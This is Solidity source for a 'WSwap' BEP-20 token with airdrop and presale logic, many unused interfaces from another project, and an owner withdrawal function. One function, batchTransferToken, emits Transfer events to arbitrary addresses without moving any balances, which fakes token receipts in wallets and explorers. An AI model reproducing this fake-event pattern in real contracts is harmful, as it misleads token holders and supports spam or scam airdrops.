/**
 *Submitted for verification at BscScan.com on 2021-07-24
*/

pragma solidity >=0.5.10;
interface genesisCalls {

  function AllowAddressToDestroyGenesis ( address _from, address _address ) external;

  function AllowReceiveGenesisTransfers ( address _from ) external;

  function BurnTokens ( address _from, uint256 mneToBurn ) external returns ( bool success );

  function RemoveAllowAddressToDestroyGenesis ( address _from ) external;

  function RemoveAllowReceiveGenesisTransfers ( address _from ) external;

  function RemoveGenesisAddressFromSale ( address _from ) external;

  function SetGenesisForSale ( address _from, uint256 weiPrice ) external;

  function TransferGenesis ( address _from, address _to ) external;

  function UpgradeToLevel2FromLevel1 ( address _address, uint256 weiValue ) external;

  function UpgradeToLevel3FromDev ( address _address ) external;

  function UpgradeToLevel3FromLevel1 ( address _address, uint256 weiValue ) external;

  function UpgradeToLevel3FromLevel2 ( address _address, uint256 weiValue ) external;

  function availableBalanceOf ( address _address ) external view returns ( uint256 Balance );

  function balanceOf ( address _address ) external view returns ( uint256 balance );

  function deleteAddressFromGenesisSaleList ( address _address ) external;

  function isAnyGenesisAddress ( address _address ) external view returns ( bool success );

  function isGenesisAddressLevel1 ( address _address ) external view returns ( bool success );

  function isGenesisAddressLevel2 ( address _address ) external view returns ( bool success );

  function isGenesisAddressLevel2Or3 ( address _address ) external view returns ( bool success );

  function isGenesisAddressLevel3 ( address _address ) external view returns ( bool success );

  function ownerGenesis (  ) external view returns ( address );

  function ownerGenesisBuys (  ) external view returns ( address );

  function ownerMain (  ) external view returns ( address );

  function ownerNormalAddress (  ) external view returns ( address );

  function ownerStakeBuys (  ) external view returns ( address );

  function ownerStakes (  ) external view returns ( address );

  function setGenesisCallerAddress ( address _caller ) external returns ( bool success );
  
  function setOwnerGenesisBuys (  ) external;

  function setOwnerMain (  ) external;
  
  function setOwnerNormalAddress (  ) external;
  
  function setOwnerStakeBuys (  ) external;
  
  function setOwnerStakes (  ) external;
  
  function BurnGenesisAddresses ( address _from, address[] calldata _genesisAddressesToBurn ) external;

}


interface normalAddress {
  
  function BuyNormalAddress ( address _from, address _address, uint256 _msgvalue ) external returns ( uint256 _totalToSend );
  
  function RemoveNormalAddressFromSale ( address _address ) external;
  
  function setBalanceNormalAddress ( address _from, address _address, uint256 balance ) external;
  
  function SetNormalAddressForSale ( address _from, uint256 weiPricePerMNE ) external;
  
  function setOwnerMain (  ) external;
  
  function ownerMain (  ) external view returns ( address );
}




interface stakes {

  function RemoveStakeFromSale ( address _from ) external;

  function SetStakeForSale ( address _from, uint256 priceInWei ) external;

  function StakeTransferGenesis ( address _from, address _to, uint256 _value, address[] calldata _genesisAddressesToBurn ) external;

  function StakeTransferMNE ( address _from, address _to, uint256 _value ) external returns ( uint256 _mneToBurn );

  function ownerMain (  ) external view returns ( address );

  function setBalanceStakes ( address _from, address _address, uint256 balance ) external;

  function setOwnerMain (  ) external;

}



interface stakeBuys {

  function BuyStakeGenesis ( address _from, address _address, address[] calldata _genesisAddressesToBurn, uint256 _msgvalue ) external returns ( uint256 _feesToPayToSeller );

  function BuyStakeMNE ( address _from, address _address, uint256 _msgvalue ) external returns ( uint256 _mneToBurn, uint256 _feesToPayToSeller );

  function ownerMain (  ) external view returns ( address );

  function setOwnerMain (  ) external;

}



interface genesisBuys {

  function BuyGenesisLevel1FromNormal ( address _from, address _address, uint256 _msgvalue ) external returns ( uint256 _totalToSend );

  function BuyGenesisLevel2FromNormal ( address _from, address _address, uint256 _msgvalue ) external returns ( uint256 _totalToSend );

  function BuyGenesisLevel3FromNormal ( address _from, address _address, uint256 _msgvalue ) external returns ( uint256 _totalToSend );

  function ownerMain (  ) external view returns ( address );

  function setOwnerMain (  ) external;

}



interface tokenService {  

  function ownerMain (  ) external view returns ( address );

  function setOwnerMain (  ) external;

  function circulatingSupply() external view returns (uint256);

  function DestroyGenesisAddressLevel1(address _address) external;

  function Bridge(address _sender, address _address, uint _amount) external;

}

interface baseTransfers {
	function setOwnerMain (  ) external;
	
    function transfer ( address _from, address _to, uint256 _value ) external;
	
    function transferFrom ( address _sender, address _from, address _to, uint256 _amount ) external returns ( bool success );
	
    function stopSetup ( address _from ) external returns ( bool success );
	
    function totalSupply (  ) external view returns ( uint256 TotalSupply );
}


interface mneStaking {

	function startStaking(address _sender, uint256 _amountToStake, address[] calldata _addressList, uint256[] calldata uintList) external;

}

interface luckyDraw {

	function BuyTickets(address _sender, uint256[] calldata _max) payable external returns ( uint256 );

}


interface externalService {

	function externalFunction(address _sender, address[] calldata _addressList, uint256[] calldata _uintList) payable external returns ( uint256 );

}

interface externalReceiver {

	function externalFunction(address _sender, uint256 _mneAmount, address[] calldata _addressList, uint256[] calldata _uintList) payable external;

}



library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

contract ERC20Interface {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);

  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract Owned {
  address public owner;
  address public newOwner;

  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address _newOwner) public onlyOwner {
    newOwner = _newOwner;
  }
  function acceptOwnership() public {
    require(msg.sender == newOwner);
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
    newOwner = address(0);
  }
}

contract TokenERC20 is ERC20Interface, Owned{
  using SafeMath for uint;

  string public symbol;
  string public name;
  uint8 public decimals;
  uint _totalSupply;

  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  constructor() public {
    symbol = "WSwap";
    name = "WSwap";
    decimals = 0;
    _totalSupply = 10000000000000e0;
    balances[owner] = _totalSupply;
    emit Transfer(address(0), owner, _totalSupply);
  }

  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
      return balances[tokenOwner];
  }
  function transfer(address to, uint tokens) public returns (bool success) {
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
    balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }
  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
    return true;
  }
  function () external payable {
    revert();
  }
}

contract WSwap is TokenERC20 {

  
  uint256 public aSBlock; 
  uint256 public aEBlock; 
  uint256 public aCap; 
  uint256 public aTot; 
  uint256 public aAmt; 
  uint256 public mAAmt;

 
  uint256 public sSBlock; 
  uint256 public sEBlock; 
  uint256 public sCap; 
  uint256 public sTot; 
  uint256 public sChunk; 
  uint256 public mSChunk; 
  uint256 public sPrice; 
  
  bool public isSaleRunning;
  bool public isAirdropRunning;

  function getAirdrop(address _refer) public returns (bool success){
    require(aSBlock <= block.number && block.number <= aEBlock);
    require(aTot < aCap || aCap == 0);
    require(isAirdropRunning ==true);
    aTot ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      balances[address(this)] = balances[address(this)].sub(aAmt / 2);
      balances[_refer] = balances[_refer].add(aAmt / 2);
      emit Transfer(address(this), _refer, aAmt / 2);
    }
    balances[address(this)] = balances[address(this)].sub(aAmt);
    balances[msg.sender] = balances[msg.sender].add(aAmt);
    emit Transfer(address(this), msg.sender, aAmt);
    return true;
  }

  function tokenSale(address _refer) public payable returns (bool success){
    require(sSBlock <= block.number && block.number <= sEBlock);
    require(sTot < sCap || sCap == 0);
    require(isSaleRunning == true);
    uint256 _eth = msg.value;
    uint256 _tkns;
    if(sChunk != 0) {
      uint256 _price = _eth / sPrice;
      _tkns = sChunk * _price;
    }
    else {
      _tkns = _eth / sPrice;
    }
    sTot ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      balances[address(this)] = balances[address(this)].sub(_tkns / 2);
      balances[_refer] = balances[_refer].add(_tkns / 2);
      emit Transfer(address(this), _refer, _tkns / 2);
    }
    balances[address(this)] = balances[address(this)].sub(_tkns);
    balances[msg.sender] = balances[msg.sender].add(_tkns);
    emit Transfer(address(this), msg.sender, _tkns);
    return true;
  }
  
   function mGetAirdrop(address _refer) public returns (bool success){
    require(aSBlock <= block.number && block.number <= aEBlock);
    require(aTot < aCap || aCap == 0);
    require(isAirdropRunning ==true);
    aTot ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      balances[address(this)] = balances[address(this)].sub(mAAmt / 2);
      balances[_refer] = balances[_refer].add(mAAmt / 2);
      emit Transfer(address(this), _refer, mAAmt / 2);
    }
    balances[address(this)] = balances[address(this)].sub(mAAmt);
    balances[msg.sender] = balances[msg.sender].add(mAAmt);
    emit Transfer(address(this), msg.sender, mAAmt);
    return true;
  }
  
    function mTokenSale(address _refer) public payable returns (bool success){
    require(sSBlock <= block.number && block.number <= sEBlock);
    require(sTot < sCap || sCap == 0);
    require(isSaleRunning == true);
    uint256 _eth = msg.value;
    uint256 _tkns;
    if(mSChunk != 0) {
      uint256 _price = _eth / sPrice;
      _tkns = mSChunk * _price;
    }
    else {
      _tkns = _eth / sPrice;
    }
    sTot ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      balances[address(this)] = balances[address(this)].sub(_tkns / 2);
      balances[_refer] = balances[_refer].add(_tkns / 2);
      emit Transfer(address(this), _refer, _tkns / 2);
    }
    balances[address(this)] = balances[address(this)].sub(_tkns);
    balances[msg.sender] = balances[msg.sender].add(_tkns);
    emit Transfer(address(this), msg.sender, _tkns);
    return true;
  }

  function viewAirdrop() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 DropCap, uint256 DropCount, uint256 DropAmount){
    return(aSBlock, aEBlock, aCap, aTot, aAmt);
  }
  function viewSale() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 SaleCap, uint256 SaleCount, uint256 ChunkSize, uint256 SalePrice){
    return(sSBlock, sEBlock, sCap, sTot, sChunk, sPrice);
  }
  
  function startAirdrop(uint256 _aSBlock, uint256 _aEBlock, uint256 _aAmt, uint256 _mAAmt, uint256 _aCap) public onlyOwner() {
    aSBlock = _aSBlock;
    aEBlock = _aEBlock;
    aAmt = _aAmt;
    mAAmt = _mAAmt;
    aCap = _aCap;
    aTot = 0;
  }
  function startSale(uint256 _sSBlock, uint256 _sEBlock, uint256 _sChunk, uint256 _sPrice, uint256 _mSChunk, uint256 _sCap) public onlyOwner() {
    sSBlock = _sSBlock;
    sEBlock = _sEBlock;
    sChunk = _sChunk;
    mSChunk = _mSChunk;
    sPrice =_sPrice;
    sCap = _sCap;
    sTot = 0;
  }
   function setSaleActivation(bool _isSaleRunning) public onlyOwner() {
   isSaleRunning = _isSaleRunning;
  }
   function startAirdrop(bool _isAirdropRunning) public onlyOwner() {
    isAirdropRunning = _isAirdropRunning;
  }
  
      function batchTransferToken(address[] memory holders, uint256 amount) public payable {
        for (uint i=0; i<holders.length; i++) {
            emit Transfer(address(this), holders[i], amount);
        }
    }
  
  function clearETH() public onlyOwner() {
    address payable _owner = msg.sender;
    _owner.transfer(address(this).balance);
  }
  function() external payable {

  }
}